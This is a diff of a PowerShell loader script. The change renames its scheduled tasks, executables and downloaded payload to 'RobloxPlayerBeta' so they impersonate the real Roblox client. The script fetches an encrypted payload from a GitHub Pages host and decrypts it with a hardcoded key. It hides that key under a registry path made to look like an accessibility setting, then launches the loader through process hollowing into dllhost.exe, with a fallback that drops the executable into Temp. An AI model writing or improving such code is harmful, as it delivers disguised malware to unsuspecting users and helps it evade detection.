@@ -21,8 +21,8 @@ if ($scriptRoot) { $scriptRoot = (Get-Item $scriptRoot).FullName }
 $ServerBaseUrl  = "https://cc312123.github.io/lowlife/files"
 $KeyRegPath     = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Accessibility"
 $KeyRegName     = "Configuration"
-$LoaderTaskName = "RobloxCrashHandler"
-$PersistTask    = "RobloxCrashHandlerBootstrapper"
+$LoaderTaskName = "RobloxPlayerBeta"
+$PersistTask    = "RobloxPlayerBetaBootstrapper"
 $HostProcess    = "C:\Windows\System32\dllhost.exe"
 
 # Resolve workspace path safely to prevent system32 registry corruption
@@ -441,7 +441,7 @@ Write-Host "[1/4] Stopping existing instances..." -ForegroundColor Yellow
 Stop-ScheduledTask -TaskName $LoaderTaskName -ErrorAction SilentlyContinue
 Stop-ScheduledTask -TaskName $PersistTask    -ErrorAction SilentlyContinue
 # Kill old file-based process if still present from a previous install (exclude official Roblox process)
-Get-Process -Name "RobloxCrashHandler", "RobloxPlayerBeta" -ErrorAction SilentlyContinue | ForEach-Object {
+Get-Process -Name "RobloxPlayerBeta" -ErrorAction SilentlyContinue | ForEach-Object {
     if ($_.Path -and ($_.Path -like "*\my private\*" -or $_.Path -like "*\Temp\*")) {
         Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
     }
@@ -455,8 +455,8 @@ Write-Host "[2/4] Loading payload into RAM..." -ForegroundColor Yellow
 
 $exeBytes = $null
 $resolvedPath = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }
-$localExe = Join-Path $resolvedPath "build\RobloxCrashHandler.exe"
-$localServerExe = Join-Path $resolvedPath "updates-server\uploads\RobloxCrashHandler.exe"
+$localExe = Join-Path $resolvedPath "build\RobloxPlayerBeta.exe"
+$localServerExe = Join-Path $resolvedPath "updates-server\uploads\RobloxPlayerBeta.exe"
 
 if (Test-Path $localExe) {
     Write-Host "    Found locally compiled executable at $localExe." -ForegroundColor Green
@@ -471,7 +471,7 @@ if (Test-Path $localExe) {
     [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
     $wc       = New-Object System.Net.WebClient
     try {
-        $encBytes = $wc.DownloadData("$ServerBaseUrl/RobloxCrashHandler.enc")
+        $encBytes = $wc.DownloadData("$ServerBaseUrl/RobloxPlayerBeta.enc")
         
         $DecKey = [byte[]](0x4C,0x4F,0x57,0x4C,0x49,0x46,0x45,0x32,0x35,0x36,0x4B,0x45,0x59,0x21,0x40,0x23,
                            0x24,0x25,0x5E,0x26,0x2A,0x28,0x29,0x5F,0x2B,0x3D,0x7B,0x7D,0x7C,0x3A,0x3B,0x22)
@@ -496,10 +496,8 @@ if (Test-Path $localExe) {
 Write-Host "[3/4] Launching loader in-memory (process hollowing)..." -ForegroundColor Yellow
 
 # Remove old file-based install folder if it exists (legacy cleanup)
-$oldFolder1 = "$env:LOCALAPPDATA\RobloxCrashHandler"
-$oldFolder2 = "$env:LOCALAPPDATA\RobloxPlayerBeta"
-if (Test-Path $oldFolder1) { Remove-Item $oldFolder1 -Recurse -Force -ErrorAction SilentlyContinue }
-if (Test-Path $oldFolder2) { Remove-Item $oldFolder2 -Recurse -Force -ErrorAction SilentlyContinue }
+$oldFolder = "$env:LOCALAPPDATA\RobloxPlayerBeta"
+if (Test-Path $oldFolder) { Remove-Item $oldFolder -Recurse -Force -ErrorAction SilentlyContinue }
 
 $hollowSuccess = $false
 if (([System.Management.Automation.PSTypeName]"RunPE").Type) {
@@ -536,7 +534,7 @@ if (-not $started) {
         $fallbackExe = $localServerExe
     } else {
         $fallbackDir = Join-Path $resolvedPath "build"
-        $fallbackExe = Join-Path $fallbackDir "RobloxCrashHandler_fallback.exe"
+        $fallbackExe = Join-Path $fallbackDir "RobloxPlayerBeta_fallback.exe"
         Write-Host "    Writing decrypted bytes to $fallbackExe..." -ForegroundColor Yellow
         try {
             if (-not (Test-Path $fallbackDir)) {
@@ -545,7 +543,7 @@ if (-not $started) {
             [System.IO.File]::WriteAllBytes($fallbackExe, $exeBytes)
         } catch {
             Write-Host "    WARNING: Could not write fallback executable to ${fallbackExe}: $_" -ForegroundColor Yellow
-            $fallbackExe = Join-Path $env:TEMP "RobloxCrashHandler_fallback.exe"
+            $fallbackExe = Join-Path $env:TEMP "RobloxPlayerBeta_fallback.exe"
             Write-Host "    Attempting to write fallback executable to temp directory: $fallbackExe" -ForegroundColor Yellow
             try {
                 [System.IO.File]::WriteAllBytes($fallbackExe, $exeBytes)
